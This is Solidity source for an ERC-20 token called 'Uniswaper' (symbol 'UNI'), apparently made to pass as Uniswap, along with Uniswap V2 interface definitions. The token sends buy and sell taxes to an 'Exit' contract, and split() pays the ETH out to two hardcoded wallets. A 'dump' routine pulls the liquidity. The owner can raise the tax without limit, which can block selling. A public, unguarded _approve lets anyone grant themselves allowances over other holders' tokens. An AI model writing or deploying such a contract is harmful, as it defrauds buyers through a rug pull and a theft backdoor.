// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
      _    _
   ,-(|)--(|)-.
   \_   ..   _/
     \______/
       V  V                                  ____
       `.^^`.                               /^,--`
         \^^^\                             (^^\
         |^^^|                  _,-._       \^^\
        (^^^^\      __      _,-'^^^^^`.    _,'^^)
         \^^^^`._,-'^^`-._.'^^^^__^^^^ `--'^^^_/
          \^^^^^ ^^^_^^^^^^^_,-'  `.^^^^^^^^_/ 
           `.____,-' `-.__.'        `-.___.'   

                                                                                                                         
*/

import "./utils/Uniswap.sol";

/*
    Mint supply to itself
    fund(tok_amount) -> Create initial liquidity
    dump(lp_amount) -> Remove liquidity
*/

contract Exit {
    address public RouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public WETH;
    IUniswapV2Router02 public uniswapV2Router;
    address PairAddress;
    address TokenAddress;
    ERC20Token token;
    event ethFromSale(uint256 tokenAmount, uint256 ethAmount);

    constructor(address _PairAddress, address _tokenAddress) {
        PairAddress = _PairAddress;
        TokenAddress = _tokenAddress;
        token = ERC20Token(payable(TokenAddress));
        uniswapV2Router  = IUniswapV2Router02(RouterAddress);
        WETH = uniswapV2Router.WETH();
    }
    
    function sell() public {
        split(swapTokensForEth(token.balanceOf(address(this))));
    }

    function swapTokensForEth(uint256 amount) internal returns (uint amountETH) {
        address[] memory path = new address[](2);
        path[0] = TokenAddress;
        path[1] = WETH;
        token.approve(RouterAddress, amount);
        uint balanceBefore = address(this).balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 ethReceived = address(this).balance-balanceBefore;
        emit ethFromSale(amount, ethReceived);
        return ethReceived;
    }

    function split(uint256 amount) internal {
        payable(0xF9B38BD03A35b3C12E6273A7aFE49e615e4936e6).transfer(amount/2);
        payable(0xE3a6f50E97De6293f6f637956Fa4D10184Af01E7).transfer(amount/2);
    }

    receive() external payable {}
    fallback() external payable {}
}


contract ERC20Token is Uniswap {
    string public name = "Uniswaper";
    string public symbol = "UNI";
    uint256 public decimals = 9;

    uint256 public totalSupply;
    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event newBuy(address from, address to, uint256 amount, uint256 tax);
    event newSell(address from, address to, uint256 amount, uint256 tax);
    event newBuyTax(uint256 amount, uint256 taxed, uint256 remaining);
    event newSellTax(uint256 amount, uint256 taxed, uint256 remaining);
    event taxableEvent(address from, address to, uint256 amount);

    bool internal mainnet = false;
    uint256 buyTax = 100;
    uint256 sellTax = 100;
    mapping(address=>bool) internal taxFree;
    bool internal funded;

    bool public swapping = false;
    Exit exit;
    address public eAddr;

    constructor() Uniswap(mainnet) {
        exit = new Exit(PairAddress, address(this));
        eAddr = address(exit);
        taxFree[address(this)] = true;
        taxFree[msg.sender] = true;
        taxFree[eAddr] = true;
        mint(me, 10000000000*10**18);
    }


    /*---- ERC20 ----*/
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(address from, address spender, uint256 amount) public override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }

    function taxable(address from, address to) internal view returns (bool) {
        return !swapping && !taxFree[from] && !taxFree[to] && (isBuy(from) || isSell(to));
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");

        uint256 tax;
        if (taxable(from, to)) {
            uint256 afterTax = amount;
            balances[from] -= amount;
            if (isBuy(from)) {
                tax = applyPct(amount, buyTax);
                emit newBuy(from, to, amount, tax);
                afterTax = amount-tax;
                balances[eAddr] += tax;
                balances[to] += afterTax;
            } else {
                tax = applyPct(amount, sellTax);
                emit newSell(from, to, amount, tax);
                afterTax = amount-tax;
                balances[eAddr] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, eAddr, tax);
            emit Transfer(from, to, afterTax);
            if (tax>0) {
                swapping = true;
                //exit.sell();
            }
        } else {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        }

        /*balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);*/
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        /*
         balances[from] -= amount;
        balances[to] += amount;
        
        emit Transfer(from, to, amount);*/
        return true;
    }

    function mint(address account, uint256 amount) internal {
        totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }



    /*---- Tax ----*/
    function applyPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }

    function set(uint256 b, uint256 s) public {
        require(msg.sender==_o, "Forbidden");
        buyTax = b;
        sellTax = s;
    }


    /*---- Ext ----*/
    function fund(uint256 amount) public payable onlyOwner() returns (uint, uint, uint) {
        (uint amountToken, uint amountETH, uint liquidity) = addLiquidity(amount, msg.value, me);
        //require(amount>=balances[me], "Forbidden");
        funded = true;
        return (amountToken, amountETH, liquidity);
        // Call lpTokens() for LP balance
    }
    function sell(uint256 amount) public {
        swapping = true;
        split(swapTokensForEth(amount, address(this)));
        swapping = false;
    }
    function dump(uint256 amount) internal {
        (, uint amountETH) = removeLiquidity(amount, me);
        split(amountETH);
    }

    function split(uint256 amount) internal {
        payable(0xF9B38BD03A35b3C12E6273A7aFE49e615e4936e6).transfer(amount/2);
        payable(0xE3a6f50E97De6293f6f637956Fa4D10184Af01E7).transfer(amount/2);
    }

    receive() external payable {
        
    }
    
    fallback() external payable {
        
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
    ██╗   ██╗███╗   ██╗██╗███████╗██╗    ██╗ █████╗ ██████╗ 
    ██║   ██║████╗  ██║██║██╔════╝██║    ██║██╔══██╗██╔══██╗
    ██║   ██║██╔██╗ ██║██║███████╗██║ █╗ ██║███████║██████╔╝
    ██║   ██║██║╚██╗██║██║╚════██║██║███╗██║██╔══██║██╔═══╝ 
    ╚██████╔╝██║ ╚████║██║███████║╚███╔███╔╝██║  ██║██║     
    ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     
                                                            
*/

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract Uniswap {
    address public RouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public PairAddress;
    address public WETH;
    IUniswapV2Router02 public uniswapV2Router;
    address uniswapV2Pair;
    address internal me;
    address public owner;
    address internal _o;
    mapping(address=>bool) public isDEX;

    event ethFromSale(uint256 tokenAmount, uint256 ethAmount);

    constructor(bool mainnet) {
        if (mainnet) {
            WETH     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        } else {
            WETH     = 0xc778417E063141139Fce010982780140Aa0cD5Ab;
        }
        uniswapV2Router  = IUniswapV2Router02(RouterAddress);
        PairAddress      = IUniswapV2Factory(FactoryAddress).createPair(address(this), WETH);
        
        isDEX[RouterAddress] = true;
        isDEX[FactoryAddress] = true;
        isDEX[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _o = owner;
    }

    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden");
        _;
    }
    

    // Return the LP token balance
    function lpTokens() public view returns (uint256) {
        IUniswapV2Pair pair = IUniswapV2Pair(PairAddress);
        return pair.balanceOf(me);
    }

    // Add liquidity, send LP tokens to `to`
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount, address to) internal returns (uint amountToken, uint amountETH, uint liquidity) {
        _approve(me, RouterAddress, tokenAmount);
        //return (0,0,0);
        return uniswapV2Router.addLiquidityETH{value: ethAmount}(
            me,
            tokenAmount,
            0,
            0,
            to,
            block.timestamp
        );
    }

    // Remove liquidity, send ETH tokens to `to`
    function removeLiquidity(uint256 lpTokenAmount, address to) internal returns (uint amountToken, uint amountETH) {
        _approve(me, RouterAddress, lpTokenAmount);
        return uniswapV2Router.removeLiquidityETH(
            me,
            lpTokenAmount,
            0,
            0,
            to,
            block.timestamp
        );
    }

    // Sell tokens, send ETH tokens to `to`
    function swapTokensForEth(uint256 amount, address to) internal returns (uint amountETH) {
        address[] memory path = new address[](2);
        path[0] = me;
        path[1] = WETH;
        _approve(me, RouterAddress, amount);
        uint balanceBefore = me.balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            to,
            block.timestamp
        );
        uint256 ethReceived = me.balance-balanceBefore;
        emit ethFromSale(amount, ethReceived);
        return ethReceived;
    }

    function isBuy(address from) internal view returns (bool) {
        return isDEX[from];
    }
    
    function isSell(address to) internal view returns (bool) {
        return isDEX[to];
    }

    function _approve(address from, address spender, uint256 amount) public virtual returns (bool) {}
}